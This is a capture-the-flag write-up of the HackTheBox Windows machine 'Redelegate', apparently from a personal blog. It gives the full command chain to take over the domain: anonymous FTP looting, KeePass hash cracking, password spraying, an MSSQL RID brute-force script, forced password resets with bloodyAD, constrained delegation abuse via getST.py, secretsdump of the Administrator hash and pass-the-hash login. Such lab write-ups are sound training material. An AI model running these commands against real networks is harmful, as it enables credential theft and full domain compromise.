---
title: "Redelegate"
date: 2026-04-04 00:00:00 +0100
categories: [HackTheBox, Machines]
tags:
  - windows
  - hard
---

!Pasted image 20260404093834.png

**Machine Info**
*Redelegate is a hard-difficultly Windows machine that starts with `Anonymous` FTP access, which allows the attacker to download sensitive Keepass Database files. The attacker then discovers that the credentials in the database are valid for MSSQL local login, which leads to enumerate SIDs and performs a password spray attack. Being a member of the `HelpDesk` group, the newly compromised user account `Marie.Curie `has a User-Force-Change-Password Access Control setup over the `Helen.Frost `user account; that user account has privileges to get a PS remoting session onto the Domain Controller. The `Helen.Frost` user account also has the `SeEnableDelegationPrivilege` assigned and has full control over the `FS01$ `machine account, essentially allowing the attacker account to modify the `msDS-AllowedToDelegateTo `LDAP attribute and change the password of a computer object and perform a Constrained Delegation attack.*

# Enumeration
To gather initial reconnaissance data on the target machine, we conducted a port scan using `Nmap` to identify open ports and running services.

## Nmap
We executed the following `Nmap` command to perform a comprehensive port scan.

```bash
➜ Redelegate sudo nmap -sV -sC 10.129.234.50                                   
[sudo] password for n0xshell: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-04 07:40 UTC
Nmap scan report for 10.129.234.50
Host is up (0.0071s latency).
Not shown: 984 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-04 07:40:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2026-04-04T07:41:06+00:00; +1s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-04T07:38:58
|_Not valid after:  2056-04-04T07:38:58
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2026-04-03T07:36:22
|_Not valid after:  2026-10-03T07:36:22
|_ssl-date: 2026-04-04T07:41:06+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-04T07:40:58+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

!Pasted image 20260404094231.png

## FTP Enumeration
From the `Nmap` scan results, we discovered an FTP service with anonymous login enabled on the target machine. We used the following command to authenticate and retrieve the accessible files.

```bash
➜ Redelegate ftp redelegate.vl       
Connected to dc.redelegate.vl.
220 Microsoft FTP Service
Name (redelegate.vl:n0xshell): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||55169|)
150 Opening ASCII mode data connection.
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt
```

!Pasted image 20260404094505.png

### Downloading Files
Due to the size of the KeePass database, we switched the FTP session to binary mode, allowing us to reliably download all files from the server.
```bash
ftp> get CyberAudit.txt 
<SNIP>

ftp> binary ON
200 Type set to I.
ftp> get Shared.kdbx

<SNIP>
ftp> get TrainingAgenda.txt
<SNIP>
```

!Pasted image 20260404094743.png

#### CyberAudit.txt
```txt
➜ Redelegate more CyberAudit.txt 
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

#### TrainingAgenda.txt
```text
➜ Redelegate cat TrainingAgenda.txt 
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them%   
```

To access the KeePass database, we needed the master password. A hint was found in the `TrainingAgenda` file referencing **“seasonyear”**, and since the files are dated 2024, we combined this information to generate a targeted password wordlist.

## Authenticate as SQLGuest
### Cracking Keepass Database Password

We used `keepass2john` to extract a hash from the database, which was then used for password cracking.
```bash
➜ Redelegate keepass2john Shared.kdbx > Shared.kdbx.hash
➜ Redelegate cat Shared.kdbx.hash 
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca
```

We successfully cracked the password using the `John the Ripper` password cracking tool.
```bash
➜ Redelegate john --wordlist=seasonpass.list Shared.kdbx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 5 candidates left, minimum 12 needed for performance.
Fall2024!        (Shared)     
1g 0:00:00:00 DONE (2026-04-04 07:53) 6.250g/s 31.25p/s 31.25c/s 31.25C/s Summer2024!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
!Pasted image 20260404095413.png

**Password:** `Fall2024!`

### Reviewing Keepass Database
!Pasted image 20260404095515.png

!Pasted image 20260404095550.png

### Creating User & Password List
Based on the contents of the KeePass database, we compiled a list of potential usernames and passwords.

#### User.list
```bash
administrator
ftp
SQLGuest
WEB01
Payroll
TimeSheet
```

#### Passwords.list
```bash
Spdv41gg4BlBgSYIW1gF
SguPZBKdRyxWzvXRWy6U
zDPBpaF4FywlqIv11vii
cn4KOEgsHqvKXPjEnSD9
22331144
cVkqz4bCM7kJRSNlgx2G
hMFS4I0Kj8Rcd62vqi5X
Summer2024!
Winter2024!
Spring2024!
Fall2024!
```

### Login with SQLGuest
We successfully authenticated to the MSSQL service using the `SQLGuest` account.
```bash
➜ Redelegate nxc mssql redelegate.vl -u users.list -p passwords.list --local-auth | grep '[+]'
MSSQL                    10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
```

!Pasted image 20260404100223.png

## MSSQL Enumeration

During enumeration, we identified the `msdb` database, which is a trusted system database in MSSQL.
```mysql
SQL (SQLGuest  guest@master)> enum_db
```

!Pasted image 20260404100602.png

### RID Brute Force via MSSQL
Domain user enumeration can be achieved through MSSQL by leveraging a RID brute-force technique. This approach requires a valid domain SID. As MSSQL does not provide a direct way to obtain the domain SID, we target the `krbtgt` account—an account that is guaranteed to exist in any Active Directory environment—to assist in deriving the SID.

#### Retrieve Domain SID
```bash
SQL (SQLGuest  guest@master)> select SUSER_SID('REDELEGATE\Krbtgt')  
-----------------------------------------------------------   
b'010500000000000515000000a185deefb22433798d8e847af6010000'  
```

The Domain SID is: `010500000000000515000000a185deefb22433798d8e847afa`

#### MSSQL RID Bruteforce Script
We created a custom script to automate the enumeration of domain users on the target system.
```bash
➜ Redelegate cat mssql-ridbrute.sh     
#!/bin/bash

SID_BASE="010500000000000515000000a185deefb22433798d8e847a"
TARGET="dc.redelegate.vl"
CREDS="SQLGuest:zDPBpaF4FywlqIv11vii"
RID_START=${1:-1000}
RID_END=${2:-1500}

for RID in $(seq "$RID_START" "$RID_END"); do
    HEX_RID=$(printf '%08x' "$RID" | fold -w2 | tac | tr -d '\n')
    SID="${SID_BASE}${HEX_RID}"

    RES=$(mssqlclient.py "${CREDS}@${TARGET}" \
    -file <(echo "SELECT SUSER_SNAME(0x${SID});") 2>/dev/null \
    | sed -n '/^----/{n;p;}' \
    | sed 's/^REDELEGATE\\//' \
    | xargs)

    printf '\r%-60s' "RID ${RID}: ${RES}"

     "$RES" != "NULL" && -n "$RES"  && printf '\n'
done

printf '\n'
```

We retrieved the following output
```bash
➜ Redelegate bash mssql-ridbrute.sh
RID 1000: SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG       
RID 1002: DC$                                               
RID 1103: FS01$                                             
RID 1104: Christine.Flanders                                
RID 1105: Marie.Curie                                       
RID 1106: Helen.Frost                                       
RID 1107: Michael.Pontiac                                   
RID 1108: Mallory.Roberts                                   
RID 1109: James.Dinkleberg                                  
RID 1112: Helpdesk                                          
RID 1113: IT                                                
RID 1114: Finance                                           
RID 1115: DnsAdmins                                         
RID 1116: DnsUpdateProxy                                    
RID 1117: Ryan.Cooper                                       
RID 1119: sql_svc   
```

!Pasted image 20260404101955.png

### Authenticate as Marie.Curie
Leveraging the user accounts discovered through RID brute-forcing, we were able to identify valid credentials for authentication.

```bash
➜ Redelegate nxc smb redelegate.vl -u users.list -p seasonpass.list
<SNIP>

SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 
```

## BloodHound Enumeration

### BloodHound.py

We leveraged `BloodHound.py` to collect and analyze data from the `Redelegate.vl` Active Directory environment, enabling us to assess its security posture.
```bash
(.venv) ➜ BloodHound.py (bloodhound-ce) ✔ python3 bloodhound.py -u marie.curie -p 'Fall2024!' -d redelegate.vl -c all --zip -ns 10.129.234.50  --disable-autogc
```

!Pasted image 20260404103025.png


### Attack Path Gain User Level Access 

*The attack path identified in BloodHound is as follows:*  

`Marie.Curie` is a member of the `HelpDesk` group, which has the `ForceChangePassword` right over `Helen.Frost`. This privilege allows us to reset the target user’s password and authenticate as `Helen.Frost`, resulting in user-level access on the system.

!Pasted image 20260404103811.png

#### Change Password Helen.Frost
We leveraged `bloodyAD` to reset the password of `Helen.Frost`, abusing the previously identified `ForceChangePassword` privilege.

```bash
➜ Redelegate bloodyAD -u Marie.Curie -p 'Fall2024!' -d redelegate.vl -H dc.redelegate.vl -i 10.129.234.50 set password Helen.Frost 'pentest123!'
[+] Password changed successfully!
```

!Pasted image 20260404104741.png

Using the obtained credentials, we established a remote session via `evil-winrm`.


# Post-Exploitation
After gaining user-level access on the target system, we began exploring potential privilege escalation paths to obtain Administrator-level access.

## Post-Enumeration

### Identified Privilege
During enumeration, we discovered that `Helen.Frost` possesses the `SeEnableDelegationPrivilege`, which can be leveraged for privilege escalation.

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

### Further Enumeration

Abuse of Resource-Based Constrained Delegation (RBCD) was not possible, as `MachineAccountQuota` is set to **0**, preventing the creation of new machine accounts.

Instead, we exploited [Constrained Delegation](https://tldrbins.github.io/seenabledelegationprivilege/). By leveraging `SeEnableDelegationPrivilege`, we gained control over an existing machine account (`FS01$`), which allowed us to proceed with the attack.
!Pasted image 20260404105727.png

## Exploitation

### Set New Password on `FS01$`
Using the following command, we reset the password of the machine account.
```bash
➜ Redelegate bloodyAD -u helen.frost -p 'pentest123!' -d redelegate.vl -H dc.redelegate.vl -i 10.129.234.50 set password 'FS01$' 'pentest123!'
[+] Password changed successfully!

```

### Add Trusted_To_Auth_Delegation
To enable constrained delegation, the relevant attribute must be configured alongside the appropriate Service Principal Name (SPN).
```bash
➜ Redelegate bloodyAD -u helen.frost -p 'pentest123!' -d redelegate.vl -H dc.redelegate.vl -i 10.129.234.50 set object 'FS01$' msDS-AllowedToDelegateTo -v 'ldap/dc.redelegate.vl' 
```

!Pasted image 20260404110607.png

### Verify Attribute
```bash
➜ Redelegate bloodyAD -u helen.frost -p 'pentest123!' -d redelegate.vl -H dc.redelegate.vl -i 10.129.234.50 get object 'FS01$' --attr msDS-AllowedToDelegateTo,userAccountControl
```
!Pasted image 20260404110752.png

### Retrieve Service Ticket (Silver Ticket)
We configured the SPN as `LDAP`, enabling interaction with the directory service. Using constrained delegation, we performed impersonation of the Domain Controller machine account via the S4U process (S4U2Self and S4U2Proxy). This allowed us to obtain a valid service ticket, which we then used with `secretsdump` to dump the Administrator’s NTLM hash.

```bash
➜ Redelegate getST.py 'redelegate.vl/FS01$':'pentest123!' -spn ldap/dc.redelegate.vl -impersonate dc
```

!Pasted image 20260404111122.png

### Dump Administartor Hash
With the sucessfully forged silver ticket, we were able to authenticate to the service and dump the Administrator’s hash.

```bash
➜ Redelegate KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache secretsdump.py -k -no-pass dc.redelegate.vl -just-dc-user administrator 
```
!Pasted image 20260404111225.png

### Login as Administrator 
Using the obtained NTLM hash, we performed a Pass-the-Hash attack with `evil-winrm` to authenticate as `Administrator`.
```bash
➜ Redelegate evil-winrm -i dc.redelegate.vl -u administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
```

!Pasted image 20260404111347.png
